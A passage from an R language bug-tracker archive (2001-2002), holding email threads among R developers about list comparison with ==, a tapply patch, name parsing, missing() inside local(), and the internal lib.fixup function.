It is not entirely clear what we *should* be doing here. S (-PLUS 3.4)
is at least consistent:

> list(1) == list(1)
Error in list(1) == list(1): == operation on mode "list" undefined
Dumped
>  1 == list(1)
Error in 1 == list(1): == operation on mode "list" undefined
Dumped
> as.integer(1)==list(as.integer(1))
Error in as.integer(1) == list(as.integer(1)): == operation on mode "list"
        undefined
Dumped
...

so one might argue that you shouldn't do that in the first place...
(or that the bug is that we do not expressly forbid doing this.)

        -p

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1073.audit <==
Tue Aug 28 10:14:14 2001	ripley	moved from incoming to Language
Tue Aug 28 10:16:19 2001	ripley	changed notes
Tue Aug 28 10:16:19 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1076 *
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == 
From: John Chambers <jmc@research.bell-labs.com>
Date: Mon, 27 Aug 2001 08:44:22 -0400
--part of PR#1073
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1076 <==
From jmc@research.bell-labs.com  Mon Aug 27 14:45:38 2001
Received: from crufty.research.bell-labs.com (crufty.research.bell-labs.com [204.178.16.49])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id OAA16860;
	Mon, 27 Aug 2001 14:45:37 +0200 (MET DST)
Received: from scummy.research.bell-labs.com ([135.104.2.10]) by crufty; Mon Aug 27 08:40:52 EDT 2001
Received: from jessie.research.bell-labs.com (jessie.research.bell-labs.com [135.104.13.5])
	by scummy.research.bell-labs.com (8.11.4/8.11.4) with ESMTP id f7RCiOl07715;
	Mon, 27 Aug 2001 08:44:24 -0400 (EDT)
Received: from research.bell-labs.com (IDENT:jmc@newton.research.bell-labs.com [135.104.13.158])
	by jessie.research.bell-labs.com (8.9.1/8.9.1) with ESMTP id IAA18247;
	Mon, 27 Aug 2001 08:44:23 -0400 (EDT)
Sender: jmc@research.bell-labs.com
Message-ID: <3B8A40A6.15AF96C2@research.bell-labs.com>
Date: Mon, 27 Aug 2001 08:44:22 -0400
From: John Chambers <jmc@research.bell-labs.com>
Organization: Bell Labs, Lucent Technologies
X-Mailer: Mozilla 4.72 [en] (X11; U; Linux 2.2.14-5.0 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
CC: gregory_r_warnes@groton.pfizer.com, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == 
 (PR#1073)
References: <200108250208.EAA03656@pubhealth.ku.dk> <x23d6gmedm.fsf@blueberry.kubism.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Peter Dalgaard BSA wrote:
> 
> gregory_r_warnes@groton.pfizer.com writes:
> 
> > Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
> > applied to elements of a list, particularly when one of the elements is of
> > mode integer:
> >
> >       > list(1) == list(1)
> >       [1] FALSE
> >       > 1 == list(1)
> >       [1] TRUE
> >       > as.integer(1)==list(as.integer(1))
> >       [1] FALSE
> >       > as.integer(1)==list(as.double(1))
> >       [1] FALSE
> >       > list(as.integer(1))==list(as.integer(1))
> >       [1] FALSE
> >       > list(as.integer(1))==as.integer(1)
> >       [1] FALSE
> >       > list(as.double(1))==list(as.double(1))
> >       [1] FALSE
> >
> > However, these cases work:
> >
> >       > as.double(1)==list(as.integer(1))
> >       [1] TRUE
> >       > list(as.integer(1))==as.double(1)
> >       [1] TRUE
> >
> > Replacing the bare integer/double with a vector constructed with c() doesn't
> > change the results, and comparing between vectors created with c() appears
> > correct.
> 
> It is not entirely clear what we *should* be doing here. S (-PLUS 3.4)
> is at least consistent:
> 
> > list(1) == list(1)
> Error in list(1) == list(1): == operation on mode "list" undefined
> Dumped
> >  1 == list(1)
> Error in 1 == list(1): == operation on mode "list" undefined
> Dumped
> > as.integer(1)==list(as.integer(1))
> Error in as.integer(1) == list(as.integer(1)): == operation on mode "list"
>         undefined
> Dumped
> ...
> 
> so one might argue that you shouldn't do that in the first place...
> (or that the bug is that we do not expressly forbid doing this.)
> 
>         -p
> 
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

As of 1.4, we will have the `identical' function, which is the right way
to do such comparisons in any case.

So I'd vote for making a use of the comparison operators an error unless
the type is correct (or there is a method defined).  There is even code
in relop.c (commented out) that looks like the right test.  Any
objections?

John

-- 
John M. Chambers                  jmc@bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-2681
700 Mountain Avenue, Room 2C-282  fax:    (908)582-3340
Murray Hill, NJ  07974            web: http://www.cs.bell-labs.com/~jmc

==> 1076.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Aug 27 15:36:50 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17663;
	Mon, 27 Aug 2001 15:36:49 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f7RDZHZ03790;
	Mon, 27 Aug 2001 15:35:17 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: jmc@research.bell-labs.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == (PR#1076)
References: <200108271245.OAA16874@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 27 Aug 2001 15:35:17 +0200
In-Reply-To: <200108271245.OAA16874@pubhealth.ku.dk>
Message-ID: <x27kvpwrqi.fsf@blueberry.kubism.ku.dk>
Lines: 56
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

jmc@research.bell-labs.com writes:

> > >       > list(1) == list(1)
> > >       [1] FALSE
> > >       > 1 == list(1)
> > >       [1] TRUE
> > >       > as.integer(1)==list(as.integer(1))
> > >       [1] FALSE
> > >       > as.integer(1)==list(as.double(1))
> > >       [1] FALSE
> > >       > list(as.integer(1))==list(as.integer(1))
> > >       [1] FALSE
> > >       > list(as.integer(1))==as.integer(1)
> > >       [1] FALSE
> > >       > list(as.double(1))==list(as.double(1))
> > >       [1] FALSE
> > >
> > > However, these cases work:
> > >
> > >       > as.double(1)==list(as.integer(1))
> > >       [1] TRUE
> > >       > list(as.integer(1))==as.double(1)
> > >       [1] TRUE
....
> As of 1.4, we will have the `identical' function, which is the right way
> to do such comparisons in any case.
> 
> So I'd vote for making a use of the comparison operators an error unless
> the type is correct (or there is a method defined).  There is even code
> in relop.c (commented out) that looks like the right test.  Any
> objections?

Not really, except that I get the usual nagging suspicion that someone
(who?) meant something by doing it this way...

The current logic seems to be that if either side of the == is a
vector of atomic type, try to coerce the list on the other side to a
similar object and then test. However this has a clear bug in that the
coercion is to double even when the atomic vector is integer. If there
are lists on both sides, a pointer comparison is done:

> x<-2
> list(x)==list(x)
[1] FALSE
> list(.Alias(x))==list(.Alias(x))
[1] TRUE

The latter seems highly dubious to me. I'd rather have a recursive
pairwise application of "==" there. However, none of this is what
identical does, is it?

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1076.audit <==
Tue Aug 28 10:14:14 2001	ripley	moved from incoming to Language
Tue Aug 28 10:15:49 2001	ripley	changed notes
Tue Aug 28 10:15:49 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1186 *
Subject: a patch to tapply
From: Vadim Ogranovich <vograno@arbitrade.com>
Date: Thu, 29 Nov 2001 14:48:35 -0600
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1186 <==
From postmaster@franz.stat.wisc.edu  Thu Nov 29 21:48:55 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA14928
	for <r-bugs@biostat.ku.dk>; Thu, 29 Nov 2001 21:48:54 +0100 (MET)
Received: from syn.arbitrade.com (really [208.47.220.70]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m169Y6y-000IWoC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:48:48 -0600 (CST) 
Received: from urg.arbitrade.com (urg.arbitrade.com [10.0.9.25])
	by syn.arbitrade.com (8.11.1/8.11.1) with ESMTP id fATKlSE29652
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:47:28 -0600 (CST)
Received: from mnmail.arbitrade.com (mnmail.arbitrade.com [38.156.36.157])
	by urg.arbitrade.com (8.11.1/8.11.1) with ESMTP id fATKmf519971
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:48:41 -0600 (CST)
Received: by mnmail.arbitrade.com with Internet Mail Service (5.5.2653.19)
	id <XXDQF55J>; Thu, 29 Nov 2001 14:48:41 -0600
Message-ID: <AFD78192EC49D311BFAE00902798AB8F23D65A@jupiter.sc.arbitrade.com>
From: Vadim Ogranovich <vograno@arbitrade.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: a patch to tapply
Date: Thu, 29 Nov 2001 14:48:35 -0600
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2653.19)
Content-Type: text/plain;
	charset="iso-8859-1"

Though tapply(x, factor, fun, simplify =TRUE) should be equivalent to
sapply(split(x, factor), fun, simplify=TRUE), note simplify=TRUE, it is not
so if fun() returns a vector rather than a scalar, e.g.

> tapply(1:6, c(0,0,0,1,1,1), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
$"0"
min max 
  1   3 

$"1"
min max 
  4   6 

> sapply(split(1:6, c(0,0,0,1,1,1)), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
    0 1
min 1 4
max 3 6

The patch submitted below fixes this problem
> tapply.new(1:6, c(0,0,0,1,1,1), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
    0 1
min 1 4
max 3 6

Another potential problem, which I am not able to verify at the moment, is
that whenever simplification is possible S-Plus returns a TRANSPOSE of that
of R, i.e.
  min max
0   1   3
1   4   6

Fixing this would require small changes to both tapply and sapply and I'll
be happy to provide the patches if requested.


R Version
> sapply(R.Version(), I)
           platform                arch                  os
system 
"i686-pc-linux-gnu"              "i686"         "linux-gnu"   "i686,
linux-gnu" 
             status               major               minor
year 
                 ""                 "1"               "3.1"
"2001" 
              month                 day            language 
               "08"                "31"                 "R"

 **************
The patch:
"tapply.new" <-
  function (X, INDEX, FUN = NULL, ..., simplify = TRUE) 
{
  FUN <- if (!is.null(FUN)) 
    match.fun(FUN)
  if (!is.list(INDEX)) 
    INDEX <- list(INDEX)
  nI <- length(INDEX)
  namelist <- vector("list", nI)
  names(namelist) <- names(INDEX)
  extent <- integer(nI)
  nx <- length(X)
  one <- as.integer(1)
  group <- rep(one, nx)
  ngroup <- one
  for (i in seq(INDEX)) {
    index <- as.factor(INDEX[[i]])
    if (length(index) != nx) 
      stop("arguments must have same length")
    namelist[[i]] <- levels(index)
    extent[i] <- nlevels(index)
    group <- group + ngroup * (as.integer(index) - one)
    ngroup <- ngroup * nlevels(index)
  }
  if (is.null(FUN)) 
    return(group)
  ans <- lapply(split(X, group), FUN, ...)
  if (simplify && length(common.len <- unique(unlist(lapply(ans, length))))
== 1) {
    if (common.len > 1) {
      extent <- c(common.len, extent)
      namelist <- c(list(names(ans[[1]])), namelist)
    }
    ansmat <- array(unlist(ans, recursive = FALSE), dim = extent, dimnames =
namelist)
    return(ansmat)
  }
  index <- as.numeric(names(ans))
  ansmat <- array(vector("list", prod(extent)), dim = extent, 
                  dimnames = namelist)
  names(ans) <- NULL
  ansmat[index] <- ans
  ansmat
}

-------------------------------------------------- 
DISCLAIMER 
This e-mail, and any attachments thereto, is intended only for use by the
addressee(s) named herein and may contain legally privileged and/or
confidential information.  If you are not the intended recipient of this
e-mail, you are hereby notified that any dissemination, distribution or
copying of this e-mail, and any attachments thereto, is strictly prohibited.
If you have received this e-mail in error, please immediately notify me and
permanently delete the original and any copy of any e-mail and any printout
thereof. 

E-mail transmission cannot be guaranteed to be secure or error-free.  The
sender therefore does not accept liability for any errors or omissions in
the contents of this message which arise as a result of e-mail transmission.

NOTICE REGARDING PRIVACY AND CONFIDENTIALITY 

Knight Trading Group may, at its discretion, monitor and review the content
of all e-mail communications. 


==> 1186.audit <==
Fri Dec 28 20:08:08 2001	thomas	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1214 *
Subject: syntax questtion, maybe a bug
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Date: Thu, 13 Dec 2001 13:46:54 -0500 (EST)
--Is .2logl meant to be a valid name in R? It is S
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1214 <==
From rmh@surfer.sbm.temple.edu  Thu Dec 13 19:44:55 2001
Received: from surfer.sbm.temple.edu (surfer.sbm.temple.edu [155.247.185.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA09950
	for <R-bugs@biostat.ku.dk>; Thu, 13 Dec 2001 19:44:55 +0100 (MET)
Received: (from rmh@localhost)
	by surfer.sbm.temple.edu (8.11.1/8.11.1) id fBDIksf2527242
	for R-bugs@biostat.ku.dk; Thu, 13 Dec 2001 13:46:54 -0500 (EST)
Date: Thu, 13 Dec 2001 13:46:54 -0500 (EST)
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Message-Id: <200112131846.fBDIksf2527242@surfer.sbm.temple.edu>
To: R-bugs@biostat.ku.dk
Subject: syntax questtion, maybe a bug


S-Plus takes names of the form ".2logl" since it sees a single set of
letters beginning with "." and continuing with alphanumerics.
> .2logl <- function(x) 2*log(x)
> .2logl(3)
[1] 2.197225
>

The same name is rejected by R, my guess is that the ".2" is recognized as
a number and then there is no operator symbol between the "2" and the
following alphabet symbols.
> .2logl <- function(x) 2*log(x)
Error: syntax error

Is this an intentional syntax difference between R and S?  Or is it a bug?


(continue)
I am using rw1031 Version 1.3.1  (2001-08-31) on windows.

Rich

==> 1214.audit <==
Sat Dec 15 10:55:43 2001	ripley	changed notes
Sat Dec 15 10:55:43 2001	ripley	foobar
Sat Dec 15 10:55:43 2001	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1241 *
Subject:  Problem with "missing" in "local" 
From: J.C.Rougier@durham.ac.uk
Date: Fri, 4 Jan 2002 13:34:34 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1241 <==
From postmaster@franz.stat.wisc.edu  Fri Jan  4 14:41:56 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA07662
	for <r-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 14:41:55 +0100 (MET)
Received: from hermes.dur.ac.uk (really [129.234.4.9]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16MUb9-000IZ3C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 4 Jan 2002 07:41:27 -0600 (CST) 
Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g04DYZr02195
	for <r-bugs@r-project.org>; Fri, 4 Jan 2002 13:34:35 GMT
Received: from arrow.dur.ac.uk by euclid id <g04DYYG10013@euclid>; Fri, 4 Jan 2002 13:34:34 GMT
From: J.C.Rougier@durham.ac.uk
Date: Fri, 4 Jan 2002 13:34:34 GMT
Message-Id: <28125.200201041334@arrow.dur.ac.uk>
To: r-bugs@r-project.org
Subject:  Problem with "missing" in "local" 
Cc: dma0jcr@arrow.dur.ac.uk
X-ECS-MailScanner: Found to be clean

Hi everyone,

I encountered unexpected behaviour when calling "missing" within a
"local" environment, namely

fred <- function(x, y)
{
  x <- as.vector(x)
  local({
    dontwantme <- 1:100
    if (missing(y)) print("No \"y\" today")
  })
  x
}

whereupon I get

> fred(1:10)
Error in eval(expr, envir, enclos) : "missing" illegal use of missing

I think it is reasonable to expect missing to work in this context (I
suspect the problem relates to lazy evaluation): if not, it might be
helpful to amend the help file.

Cheers, Jonathan.

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 4.0
 year = 2001
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, Autoloads, package:base

==> 1241.followup.1 <==
From ripley@stats.ox.ac.uk  Fri Jan  4 14:51:24 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA07830
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 14:51:23 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id NAA03055;
	Fri, 4 Jan 2002 13:50:56 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g04Doui08194;
	Fri, 4 Jan 2002 13:50:56 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Fri, 4 Jan 2002 13:50:56 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <J.C.Rougier@durham.ac.uk>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Problem with "missing" in "local" (PR#1241)
In-Reply-To: <200201041341.OAA07672@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201041347390.8133-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Fri, 4 Jan 2002 J.C.Rougier@durham.ac.uk wrote:

> Hi everyone,
>
> I encountered unexpected behaviour when calling "missing" within a
> "local" environment, namely
>
> fred <- function(x, y)
> {
>   x <- as.vector(x)
>   local({
>     dontwantme <- 1:100
>     if (missing(y)) print("No \"y\" today")
>   })
>   x
> }
>
> whereupon I get
>
> > fred(1:10)
> Error in eval(expr, envir, enclos) : "missing" illegal use of missing
>
> I think it is reasonable to expect missing to work in this context (I
> suspect the problem relates to lazy evaluation): if not, it might be
> helpful to amend the help file.

Why do you think it reasonable?  You've take a function from

     Evaluate an R expression in a specified environment.

and evaluated it somewhere where missing() is not defined.  If you had
used eval() explicitly, would you think it reasonable?  I doubt it.

Which help file did you have in mind?

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1241.followup.2 <==
From J.C.Rougier@durham.ac.uk  Fri Jan  4 15:48:01 2002
Received: from hermes.dur.ac.uk (hermes.dur.ac.uk [129.234.4.9])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA09042
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 15:48:01 +0100 (MET)
Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g04EbSr02994;
	Fri, 4 Jan 2002 14:37:29 GMT
Received: from durham.ac.uk by euclid id <g04EbSG15752@euclid>; Fri, 4 Jan 2002 14:37:28 GMT
Sender: dma0jcr@durham.ac.uk
Message-ID: <3C35BE28.DFA1C500@durham.ac.uk>
Date: Fri, 04 Jan 2002 14:37:28 +0000
From: Jonathan Rougier <J.C.Rougier@durham.ac.uk>
Organization: Maths Dept., Univ. of Durham
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.9-12 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Problem with "missing" in "local" (PR#1241)
References: <Pine.LNX.4.31.0201041347390.8133-100000@gannet.stats>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
X-ECS-MailScanner: Found to be clean

Hi Brian,

Prof Brian Ripley wrote:
> 
> On Fri, 4 Jan 2002 J.C.Rougier@durham.ac.uk wrote:
> 
> > Hi everyone,
> >
> > I encountered unexpected behaviour when calling "missing" within a
> > "local" environment, namely
> >
> > fred <- function(x, y)
> > {
> >   x <- as.vector(x)
> >   local({
> >     dontwantme <- 1:100
> >     if (missing(y)) print("No \"y\" today")
> >   })
> >   x
> > }
> >
> > whereupon I get
> >
> > > fred(1:10)
> > Error in eval(expr, envir, enclos) : "missing" illegal use of missing
> >
> > I think it is reasonable to expect missing to work in this context (I
> > suspect the problem relates to lazy evaluation): if not, it might be
> > helpful to amend the help file.
> 
> Why do you think it reasonable?  You've take a function from
> 
>      Evaluate an R expression in a specified environment.
> 
> and evaluated it somewhere where missing() is not defined.  If you had
> used eval() explicitly, would you think it reasonable?  I doubt it.

By "reasonable" in this context I mean that the operation would appear
to be well-defined and useful.  I can access x within the local()
environment, ie it is found in the enclosing environment, and I do not
think that y should be treated any differently.  If I modify my function
to read

fred <- function(x, y)
{
  x <- as.vector(x)
  local({
    print(x)
    print(y)
    if (missing(y)) print("No \"y\" today")
  })
  x
}

then I get the error message

> fred(1:10)
 [1]  1  2  3  4  5  6  7  8  9 10
Error in print(y) : Argument "y" is missing, with no default

This error message suggests to me that "missing(y)" would evaluate
correctly.

> 
> Which help file did you have in mind?
> 

The help file for "missing".  This points out that "missing" is not
always reliable, eg after "x <- match.arg(x)".  Perhaps this could be
another example of "unreliability".

Cheers, Jonathan.

-- 
Jonathan Rougier                       Science Laboratories
Department of Mathematical Sciences    South Road
University of Durham                   Durham DH1 3LE
tel: +44 (0)191 374 2361, fax: +44 (0)191 374 7388
http://www.maths.dur.ac.uk/stats/people/jcr/jcr.html

==> 1241.audit <==
Mon Jan  7 10:33:01 2002	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1556 *
Subject: lib.fixup, .GlobalEnv, and R1.5.0
From: mark.bravington@csiro.au
Date: Wed, 15 May 2002 08:30:50 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1556 <==
From mark.bravington@csiro.au  Wed May 15 08:30:50 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA24614
	for <R-bugs@biostat.ku.dk>; Wed, 15 May 2002 08:30:50 +0200 (MET DST)
Date: Wed, 15 May 2002 08:30:50 +0200 (MET DST)
From: mark.bravington@csiro.au
Message-Id: <200205150630.IAA24614@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: lib.fixup, .GlobalEnv, and R1.5.0

Full_Name: Mark Bravington
Version: 1.5.0
OS: Windows 2000
Submission from: (NULL) (140.79.2.3)


In R1.3.1, I used the following code inside a function to set a "path" attribute
to .GlobalEnv:

  env_ pos.to.env( 1)
  attr( env, 'path')_ .Path # .Path is a named char vector of length 1
  .Internal( lib.fixup( env, .GlobalEnv)) # adds the attribute

And this works fine. But in R1.5.0, the same code (executed e.g. within a call
to "local" from the command line) removes all the objects in .GlobalEnv (note,
though, that the 'path' attribute does get set OK). For various reasons, this
feature is crucial to me, so I can't actually use R1.5.0 without it!

Oddly, my code used to explicitly set a path attribute for newly-attached things
using this mechanism, and this has now been incorporated into R1.5.0 "library"
command. So I'm clearly not doing anything naughty here!

A suggestion: wouldn't it be easier if we could use

attr( env, <<whatever>>) # where env is an environment

and

attr( env, <<whatever>>)_ 45

instead of having to go via "lib.fixup"?

cheers
Mark


  

==> 1556.followup.1 <==
From Mark.Bravington@csiro.au  Thu May 16 08:48:23 2002
Received: from bastion.tas.csiro.au (bastion.tas.csiro.au [140.79.2.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA04149
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 08:48:21 +0200 (MET DST)
From: Mark.Bravington@csiro.au
Received: from bastion.tas.csiro.au (localhost [127.0.0.1])
	by bastion.tas.csiro.au (8.11.4/8.11.4) with ESMTP id g4G6le813565
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 16:47:41 +1000 (EST)
Received: from molly.tas.csiro.au (molly.tas.csiro.au [140.79.3.40])
	by bastion.tas.csiro.au (8.11.4/8.11.4) with ESMTP id g4G6leO13554
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 16:47:40 +1000 (EST)
Received: by molly.tas.csiro.au with Internet Mail Service (5.5.2655.55)
	id <KSPS0LFF>; Thu, 16 May 2002 16:47:30 +1000
Message-ID: <A8877251964B294BAB5BA1FC58B43FED26DC18@molly.tas.csiro.au>
To: r-bugs@biostat.ku.dk
Subject: (PR#1556)
Date: Thu, 16 May 2002 16:47:26 +1000
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2655.55)
Content-Type: text/plain;
	charset="iso-8859-1"

lib.fixup

My previous post mentions a problem encountered when calling ".Internal(
lib.fixup..." in R1.5.0. I have since found a workaround. It's possible in
R1.5.0 to set attributes of search path environments directly, like so:

> env_ pos.to.env( 3)
> attr( env, 'any.attr')_ 'any.value'
> pos.to.env( 3)
<environment: package:tcltk>
attr(,"name")
[1] "package:tcltk"
attr(,"path")
[1] "C:/R/rw1050/library/tcltk"
attr(,"any.attr")
[1] "any.value"

In R1.3.1, it used to be necessary to use lib.fixup to achieve this. It's
still not possible to call

> attr( pos.to.env( 3), 'any.attr')_ 'any.value'

directly, but this doesn't matter. My (mis-typed) wish-lish-suggestion in
the last post, is therefore irrelevant, and personally I no longer need
lib.fixup. NB that it can still cause problems if it is used-- but as it's
undocumented, I don't suppose this will be a major issue.

Nevertheless, calls to ".Internal( lib.fixup..." are not things of beauty,
and I wonder whether the current usage in "library" is actually necessary?
The code currently reads

            loadenv <- new.env(hash = TRUE, parent = .GlobalEnv)
            <<...>>
                sys.source(codeFile, loadenv, keep.source = keep.source)
            <<...>>
            env <- attach(NULL, name = pkgname)
            on.exit(do.call("detach", list(name = pkgname)))
            attr(env, "path") <- file.path(which.lib.loc, package)
            .Internal(lib.fixup(loadenv, env))
            
but I seem to get satisfactory results with

      env_ attach( NULL, name = pkgname)
      on.exit(do.call("detach", list(name = pkgname)))            
      attr( env, "path") <- file.path(which.lib.loc, package)
      <<...>>
          sys.source(codeFile, env, keep.source = keep.source) # i.e.
straight into "env" not into "loadenv"
      <<...>>
      
which does away with the calls to "new.env" and "lib.fixup". As far as I can
see, the "parent=.GlobalEnv" argument to "new.env" doesn't have any effect
after "lib.fixup"; I'm not sure about the "hash=TRUE".

cheers
Mark

*******************************

Mark Bravington
CSIRO (CMIS)
PO Box 1538
Castray Esplanade
Hobart
TAS 7001

phone (61) 3 6232 5118
fax (61) 3 6232 5012
Mark.Bravington@csiro.au 

==> 1556.audit <==
Thu Jan 16 10:19:58 2003	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Low-level

* PR# 989 *
Subject: "[.data.frame" allows un-named 3rd subscript
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
Date: Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 989 <==
From cberry@tajo.ucsd.edu  Mon Jun 18 22:10:28 2001
Received: from mailbox4.ucsd.edu (mailbox4.ucsd.edu [132.239.1.56])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA14900
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 22:10:27 +0200 (MET DST)
Received: from smtp.ucsd.edu (smtp.ucsd.edu [132.239.1.49])
	by mailbox4.ucsd.edu (8.11.3/8.11.0) with ESMTP id f5IKAKq28590
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 13:10:20 -0700 (PDT)
Received: from tajo.ucsd.edu (tajo.ucsd.edu [132.239.99.2])
	by smtp.ucsd.edu (8.9.3/8.9.3) with ESMTP id NAA24075
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 13:10:20 -0700 (PDT)
Received: by tajo.ucsd.edu (8.9.3+Sun/SMI-SVR4-UCSD.1)
	id NAA15110; Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
Date: Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
Message-Id: <200106182013.NAA15110@tajo.ucsd.edu>
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
